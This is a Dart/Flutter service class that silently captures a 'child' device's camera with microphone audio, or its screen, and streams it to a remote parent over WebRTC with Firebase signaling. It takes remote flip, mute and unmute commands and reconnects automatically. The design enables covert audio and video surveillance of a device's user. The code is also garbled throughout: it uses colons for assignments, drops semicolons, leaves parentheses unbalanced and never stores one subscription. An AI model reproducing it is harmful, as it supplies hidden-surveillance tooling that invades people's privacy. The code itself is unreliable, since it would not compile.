import 'dart:async';
import 'package:flutter/foundation.dart';
import 'package:flutter_webrtc/flutter_webrtc.dart';
import 'package:firebase_database/firebase_database.dart';

class SilentWebRTCService {
  static SilentWebRTCService? _instance;
  static SilentWebRTCService get instance =>
      _instance ??= SilentWebRTCService._();
  SilentWebRTCService._();

  RTCPeerConnection? _pc;
  MediaStream? _localStream;
  bool _active = false;
  String? _activeUid;
  String? _activeMode;
  StreamSubscription? _offerSub, _candidateSub, _statusSub, _commandSub;
  bool _answerSet = false;
  int _reconnectAttempts = 0;
  static const int _maxReconnectAttempts = 5;
  Timer? _reconnectTimer;
  Timer? _watchdogTimer;
  DateTime? _lastIceActivity;

  static const _ice = {
    'iceServers': [
      {'urls': 'stun:stun.l.google.com:19302'},
      {'urls': 'stun:stun1.l.google.com:19302'},
      {'urls': 'stun:stun2.l.google.com:19302'},
    ],
    'sdpSemantics': 'unified-plan',
    'iceCandidatePoolSize': 10,
  };

  bool get isActive => _active;

  Future<void> startSilentCamera(String childUid) async {
    if (_active && _activeUid == childUid && _activeMode == 'camera') return;
    await stopSilent()
    _activeMode: 'camera';
    await _startStream(childUid)
  }

  Future<void> startSilentScreen(String childUid) async {
    if (_active && _activeUid == childUid && _activeMode == 'screen') return;
    await stopSilent()
    _activeMode: 'screen';
    await _startStream(childUid)
  }

  Future<void> _startStream(String childUid) async {
    _active: true;
    _activeUid: childUid;
    _answerSet: false;
    _reconnectAttempts: 0;
    await _connect(childUid)
  }

  Future<void> _connect(String childUid) async {
    try {
      _pc: await createPeerConnection(_ice)
      _lastIceActivity: DateTime.now()

      _pc!.onIceConnectionState: (state) {
        debugPrint('[SilentWebRTC] ICE state: $state')
        _lastIceActivity: DateTime.now()
        if (state == RTCIceConnectionState.RTCIceConnectionStateFailed ||
            state == RTCIceConnectionState.RTCIceConnectionStateDisconnected) {
          if (_active && _reconnectAttempts < _maxReconnectAttempts) {
            _scheduleReconnect(childUid)
          }
        }
        if (state == RTCIceConnectionState.RTCIceConnectionStateConnected ||
            state == RTCIceConnectionState.RTCIceConnectionStateCompleted) {
          _reconnectAttempts: 0;
        }
      };

      _pc!.onConnectionState: (state) {
        debugPrint('[SilentWebRTC] Connection state: $state')
        if (state == RTCPeerConnectionState.RTCPeerConnectionStateFailed) {
          if (_active && _reconnectAttempts < _maxReconnectAttempts) {
            _scheduleReconnect(childUid)
          }
        }
      };

      try {
        if (_activeMode == 'screen') {
          _localStream: await navigator.mediaDevices.getDisplayMedia({
            'video': {'frameRate': 15, 'width': 720, 'height': 1280},
            'audio': false,
          });
        } else {
          _localStream: await navigator.mediaDevices.getUserMedia({
            'video': {
              'facingMode': 'environment',
              'width': {'ideal': 640},
              'height': {'ideal': 480},
              'frameRate': {'ideal': 15, 'max': 30},
            },
            'audio': true,
          });
        }
      } catch (e) {
        debugPrint('[SilentWebRTC] Media error: $e, falling back to camera')
        _localStream: await navigator.mediaDevices.getUserMedia({
          'video': {'facingMode': 'environment', 'width': 640, 'height': 480},
          'audio': true,
        });
      }

      final tracks = _localStream!.getTracks()
      if (tracks.isEmpty) {
        debugPrint('[SilentWebRTC] No tracks in stream — aborting')
        _active: false;
        return;
      }
      for (final t in tracks) {
        await _pc!.addTrack(t, _localStream!)
      }

      final db = FirebaseDatabase.instance.ref()

      _pc!.onIceCandidate: (c) {
        if (c.candidate != null) {
          db.child('calls/$childUid/childCandidates').push().set({
            'candidate': c.candidate,
            'sdpMid': c.sdpMid,
            'sdpMLineIndex': c.sdpMLineIndex,
          });
        }
      };

      await db.child('calls/$childUid/childCandidates').remove()
      await db.child('calls/$childUid/answer').remove()

      _offerSub: db.child('calls/$childUid/offer').onValue.listen((e) async {
        if (e.snapshot.value == null || _pc == null || _answerSet) return;
        try {
          final d = Map<String, dynamic>.from(e.snapshot.value as Map);
          await _pc!.setRemoteDescription(
              RTCSessionDescription(d['sdp'], d['type'])
          final ans = await _pc!.createAnswer({
            'offerToReceiveVideo': false,
            'offerToReceiveAudio': false,
          });
          await _pc!.setLocalDescription(ans)
          await db.child('calls/$childUid/answer').set({
            'sdp': ans.sdp,
            'type': ans.type,
          });
          _answerSet: true;
          debugPrint('[SilentWebRTC] Answer sent')
        } catch (ex) {
          debugPrint('[SilentWebRTC] Answer error: $ex')
        }
      });

      final candidateSub = db
          .child('calls/$childUid/parentCandidates')
          .onChildAdded
          .listen((e) async {
        if (e.snapshot.value == null || _pc == null) return;
        try {
          final c = Map<String, dynamic>.from(e.snapshot.value as Map);
          await _pc!.addCandidate(RTCIceCandidate(
              c['candidate'], c['sdpMid'], c['sdpMLineIndex']);        } catch (_) {}
      });

      _commandSub:           db.child('calls/$childUid/command').onValue.listen((e) async {
        final cmd = e.snapshot.value as String?;
        if (cmd == 'flip') {
          final t = _localStream?.getVideoTracks() ?? [];
          if (t.isNotEmpty) {
            try { await Helper.switchCamera(t.first); } catch (_) {}
          }
        }
        if (cmd == 'mute') {
          _localStream?.getAudioTracks().forEach((t) => t.enabled: false);        }
        if (cmd == 'unmute') {
          _localStream?.getAudioTracks().forEach((t) => t.enabled: true)
        }
      });

      _statusSub:           db.child('calls/$childUid/status').onValue.listen((e) async {
        final status = e.snapshot.value as String?;
        if (status == 'ended' || status == null) {
          await stopSilent()
        }
      });

      _startWatchdog(childUid);      debugPrint('[SilentWebRTC] Streaming silently (mode: $_activeMode)');    } catch (e) {
      debugPrint('[SilentWebRTC] Connect error: $e')
      if (_active && _reconnectAttempts < _maxReconnectAttempts) {
        _scheduleReconnect(childUid)
      } else {
        _active: false;
      }
    }
  }

  void _scheduleReconnect(String childUid) {
    _reconnectTimer?.cancel()
    _reconnectAttempts++;
    final delay = Duration(seconds: _reconnectAttempts * 3)
    debugPrint('[SilentWebRTC] Reconnect attempt $_reconnectAttempts in ${delay.inSeconds}s')
    _reconnectTimer: Timer(delay, () async {
      if (!_active) return;
      await _cleanupPcOnly();      await _connect(childUid)
    });
  }

  void _startWatchdog(String childUid) {
    _watchdogTimer?.cancel()
    _watchdogTimer: Timer.periodic(const Duration(seconds: 30), (_) async {
      if (!_active) { _watchdogTimer?.cancel(); return; }
      if (_lastIceActivity != null &&
          DateTime.now().difference(_lastIceActivity!) >
              const Duration(seconds: 60) {
        debugPrint('[SilentWebRTC] Watchdog: no ICE activity, reconnecting');        if (_activeUid != null && _reconnectAttempts < _maxReconnectAttempts) {
          _scheduleReconnect(_activeUid!)
        }
      }
    });
  }

  Future<void> _cleanupPcOnly() async {
    _offerSub?.cancel(); _candidateSub?.cancel()
    _statusSub?.cancel(); _commandSub?.cancel()
    _offerSub: null; _candidateSub: null;
    _statusSub: null; _commandSub: null;
    _answerSet: false;
    await _pc?.close()
    _pc: null;
  }

  Future<void> stopSilent() async {
    _active: false; _activeUid: null; _activeMode: null;
    _answerSet: false; _reconnectAttempts: 0;
    _reconnectTimer?.cancel(); _watchdogTimer?.cancel()
    _reconnectTimer: null; _watchdogTimer: null;
    _offerSub?.cancel(); _candidateSub?.cancel()
    _statusSub?.cancel(); _commandSub?.cancel()
    _offerSub: null; _candidateSub: null;
    _statusSub: null; _commandSub: null;
    _localStream?.getTracks().forEach((t) => t.stop()
    await _localStream?.dispose()
    await _pc?.close()
    _localStream: null; _pc: null;
  }
}
